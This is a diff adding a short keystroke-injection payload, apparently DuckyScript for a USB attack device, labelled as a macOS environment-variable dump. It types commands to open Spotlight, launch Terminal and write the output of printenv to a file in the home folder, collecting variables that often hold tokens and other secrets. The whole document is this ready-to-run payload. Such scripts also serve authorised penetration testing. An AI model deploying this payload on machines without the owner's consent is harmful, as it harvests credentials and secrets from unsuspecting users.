@@ -1,0 +1,9 @@
+REM MacOS Environment Variables Dump
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING terminal
+ENTER
+DELAY 1000
+STRING printenv > ~/env_vars.txt
+ENTER
